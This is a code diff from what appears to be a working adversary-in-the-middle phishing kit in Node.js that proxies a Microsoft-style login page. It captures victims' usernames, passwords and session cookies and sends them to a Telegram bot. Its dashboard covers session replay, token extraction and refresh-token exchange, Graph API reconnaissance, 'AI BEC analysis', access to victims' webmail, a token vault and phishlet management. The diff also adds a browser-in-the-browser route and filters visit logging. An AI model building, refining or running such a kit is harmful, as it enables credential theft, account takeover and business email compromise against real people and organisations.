@@ -23,7 +23,6 @@ async function getGeoInfo(ip) {
     }
 }
 
-// Added: Quick country code lookup for visits
 async function getCountryCode(ip) {
     try {
         const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode`);
@@ -92,7 +91,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED: Only username+password or session cookie)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -154,7 +153,6 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        // ────── BUILD MESSAGE WITH USER-AGENT ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -171,7 +169,6 @@ ${flag} **Location:** ${location}
 🖥️ **User-Agent:** ${userAgent}
         `;
 
-        // Add credentials if found
         if (hasCredentials) {
             message += `
 👤 **Username:** ${username}
@@ -179,7 +176,6 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        // Add session cookie info if found
         if (hasSessionCookie) {
             message += `
 🍪 **Session Cookie:** ✅ Captured (esctx)
@@ -216,7 +212,7 @@ const crypto = require("crypto");
 const os = require("os");
 
 // ================================================
-// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶
+// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶 (FIXED: Only log page loads)
 // ================================================
 
 const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
@@ -227,6 +223,33 @@ if (!fs.existsSync(VISITS_LOG_DIR)) {
 }
 
 async function logVisit(clientRequest, clientResponse, sessionId) {
+    const url = clientRequest.url || '';
+    const method = clientRequest.method || '';
+    
+    // ────── ONLY LOG PAGE LOADS ──────
+    const isPageLoad = (
+        method === 'GET' &&
+        (url === '/' || 
+         url.startsWith('/login') || 
+         url === '/webmail' ||
+         url === '/bitb' ||
+         url.match(/\.(html|htm)$/))
+    );
+    
+    // ────── SKIP STATIC ASSETS AND SERVICE WORKER ──────
+    const isStatic = (
+        url.includes('.css') || url.includes('.js') || 
+        url.includes('.gif') || url.includes('.svg') || 
+        url.includes('.ico') || url.includes('.png') ||
+        url.includes('service_worker') || url.includes('/@') ||
+        url.includes('favicon') || url.includes('OneCollector') ||
+        url.includes('/lNv1pC9AWPUY4gbidyBO') // Proxy path
+    );
+    
+    if (!isPageLoad || isStatic) {
+        return;
+    }
+    
     const ip = clientRequest.headers['x-real-ip'] || 
                clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                'Unknown';
@@ -397,7 +420,6 @@ dashApp.get('/api/status', (req, res) => {
     }
 });
 
-// ---------- SESSION REPLAY ----------
 dashApp.get('/api/replay/:filename', (req, res) => {
     const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
     if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
@@ -488,7 +510,6 @@ dashApp.get('/api/replay/:filename', (req, res) => {
     }
 });
 
-// ---------- TOKEN EXTRACTION ----------
 dashApp.get('/api/tokens/:filename', (req, res) => {
     const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
     if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
@@ -557,7 +578,6 @@ dashApp.get('/api/tokens/:filename', (req, res) => {
     }
 });
 
-// ---------- TOKEN EXCHANGE ----------
 dashApp.post('/api/exchange', async (req, res) => {
     const { refresh_token } = req.body;
     if (!refresh_token) return res.status(400).json({ error: 'Refresh token required' });
@@ -581,9 +601,6 @@ dashApp.post('/api/exchange', async (req, res) => {
     }
 });
 
-// ================================================
-// 🕵️ GRAPH API RECON ENDPOINT
-// ================================================
 dashApp.post('/api/recon', async (req, res) => {
     const { accessToken, refreshToken, email } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -620,9 +637,6 @@ dashApp.post('/api/recon', async (req, res) => {
     }
 });
 
-// ================================================
-// 🤖 AI BEC ANALYSIS ENDPOINT
-// ================================================
 dashApp.post('/api/ai/analyze', async (req, res) => {
     const { accessToken, refreshToken, email, groqApiKey } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
@@ -637,10 +651,6 @@ dashApp.post('/api/ai/analyze', async (req, res) => {
         res.status(500).json({ error: err.message });
     }
 });
-
-// ================================================
-// 📧 WEBMAIL API ENDPOINTS
-// ================================================
 
 dashApp.post('/api/webmail/folders', async (req, res) => {
     const { accessToken } = req.body;
@@ -745,10 +755,6 @@ dashApp.post('/api/webmail/search', async (req, res) => {
     }
 });
 
-// ================================================
-// 📊 VISITS API ENDPOINTS
-// ================================================
-
 dashApp.get('/api/visits', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
@@ -804,10 +810,6 @@ dashApp.get('/api/visits/stats', (req, res) => {
         res.status(500).json({ error: err.message });
     }
 });
-
-// ================================================
-// 🏛️ TOKEN VAULT API
-// ================================================
 
 const TokenVault = require('./token_vault.js');
 const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
@@ -878,10 +880,6 @@ dashApp.post('/api/vault/exchange', async (req, res) => {
         });
     }
 });
-
-// ================================================
-// 📊 CAMPAIGN ANALYTICS API
-// ================================================
 
 dashApp.get('/api/analytics', (req, res) => {
     try {
@@ -988,10 +986,6 @@ dashApp.get('/api/analytics', (req, res) => {
     }
 });
 
-// ================================================
-// 🎭 PHISHLET API
-// ================================================
-
 dashApp.get('/api/phishlets', (req, res) => {
     try {
         const phishletsPath = path.join(__dirname, 'phishlets.json');
@@ -1062,21 +1056,18 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
-    // ---- BITB ROUTE ----
     if (url.startsWith('/bitb')) {
         clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
         fs.createReadStream(path.join(__dirname, 'public', 'bitb.html')).pipe(clientResponse);
         return;
     }
 
-    // ---- WEBMAIL ROUTE ----
     if (url === '/webmail' || url.startsWith('/webmail?')) {
         clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
         fs.createReadStream(path.join(__dirname, 'public', 'webmail.html')).pipe(clientResponse);
         return;
     }
 
-    // Log the visit asynchronously
     logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
@@ -2006,10 +1997,8 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 
 const app = express();
 
-// Mount dashboard on /dash FIRST
 app.use('/dash', dashApp);
 
-// Mount the proxy on the root path, but SKIP /dash
 app.use((req, res) => {
     if (!req.path.startsWith('/dash')) {
         proxyServer.emit('request', req, res);
@@ -2023,7 +2012,6 @@ const server = app.listen(PORT, () => {
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
 });
 
-// ---- 𝚆𝙴𝙱𝚂𝙾𝙲𝙺𝙴𝚃 𝙵𝙾𝚁 𝙻𝙸𝚅𝙴 𝚄𝙿𝙳𝙰𝚃𝙴𝚂 ----
 const wss = new WebSocket.Server({ server });
 let clients = [];
 wss.on('connection', (ws) => {
